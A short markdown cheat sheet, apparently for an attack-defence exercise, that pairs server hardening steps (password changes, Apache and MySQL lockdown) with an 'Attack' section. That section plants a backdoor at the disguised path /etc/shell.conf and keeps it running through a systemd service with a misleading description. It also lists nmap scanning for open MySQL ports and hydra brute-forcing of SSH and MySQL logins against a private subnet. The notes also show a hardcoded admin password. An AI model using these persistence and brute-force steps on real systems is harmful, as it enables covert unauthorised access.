# Wilbur

## Change password of system users
`echo 'admin:jnjhuuinbuzeuzbcbhbhscel84786873zuhsdf' | chpasswd --crypt-method SHA512`

## Change apache
`DocumentRoot "/var/www/deathtohumanity"`

Then restart apache2 service `sudo systemctl restart apache2 `

## Disable mysql public appearance

### Update users
```
# Change passwords:
ALTER USER 'userName'@'localhost' IDENTIFIED BY 'New-Password-Here';
FLUSH PRIVILEGES;
# Drop users:
DROP USER 'jeffrey'@'localhost';

```


### Localhost only
Put following lines in `/etc/mysql/my.cnf`
```bash
[mysqld]
bind-address = 127.0.0.1
```

Then restart mysql service `sudo systemctl restart mysql `

# Attack

## Backdoor

1. Login as root
2. Place backdoor in `/etc/shell.conf`
3. Add systemctl service
    - create `/etc/systemd/system/shell.service`
        ```bash
        [Unit]
        Description=Proper shell configuration.

        [Service]
        Type=simple
        Restart=always
        RestartSec=3
        ExecStart=/usr/bin/python3 /etc/shell.conf
        Environment=PYTHONUNBUFFERED=1

        [Install]
        WantedBy=default.target
        ```
    - `systemctl enable shell`
    - `systemctl start shell`


## Find IPs with open MySQL ports
`nmap 10.6.18.0/24 -p3306 --open -oG - | awk '/Up$/{print $2}'`

## SSH
`hydra -C users.txt 10.6.18.185 ssh`

## MySQL
`hydra -C users.txt 10.6.18.185 mysql`


